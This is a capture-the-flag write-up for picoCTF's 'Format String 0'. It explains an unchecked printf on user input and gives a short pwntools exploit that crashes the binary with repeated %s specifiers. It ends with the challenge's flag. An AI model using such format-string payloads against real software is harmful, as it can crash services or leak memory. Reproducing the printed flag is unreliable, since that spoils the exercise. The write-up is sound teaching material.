# Format String 0

**Link**: https://play.picoctf.org/practice/challenge/433

**Difficulty**: easy

## Description

Can you use your knowledge of format strings to make the customers happy?

## Resources

- **format-string-0**: the vulnerable binary
- **format-string-0.c**: its source code
- **solver.py**: pwntools exploit
- **flag.txt**: local debugging flag

## Key observations (from the source)

- The flag is read into a **global** buffer `char flag[FLAGSIZE]` at startup.
- A `SIGSEGV` handler is installed that **prints the flag and exits** whenever the
  program crashes:

      void sigsegv_handler(int sig) { printf("\n%s\n", flag); ... }

  So the whole challenge reduces to *"make the program segfault"*.

- Both `serve_patrick()` and `serve_bob()` call `printf(choice)` **directly on
  user input** — a classic format-string vulnerability.
- To advance from Patrick to Bob, `printf`'s return value (chars printed) must
  exceed `2 * BUFSIZE` (64):

      int count = printf(choice1);
      if (count > 2 * BUFSIZE) serve_bob();

## How to solve

1. **Reach `serve_bob`.** The menu item `Gr%114d_Cheese` passes the menu check
   *and* contains `%114d`, which pads a number to width 114. `printf` then returns
   well over 64, so `serve_bob()` is called.

2. **Crash it.** Feed a string full of `%s` specifiers. Each `%s` makes `printf`
   dereference a stack value as a pointer; one points to unmapped memory, the
   program segfaults, and the handler dumps the flag.

Exploit (see `solver.py`, run with `python3 solver.py REMOTE`):

    print(io.recvuntil(b'recommendation: ').decode())
    io.sendline(b'Gr%114d_Cheese')          # inflate printf's return -> serve_bob
    print(io.recvuntil(b'recommendation: ').decode())
    io.sendline(b'%s' * 16)                  # bad %s reads -> SIGSEGV -> flag printed
    print(io.recvall().decode())

`solver.py` has three run modes: `python3 solver.py` (local), `GDB` (debug),
`REMOTE` (remote host/port set at the top of the file).

## Flag

    picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_f89c1405}
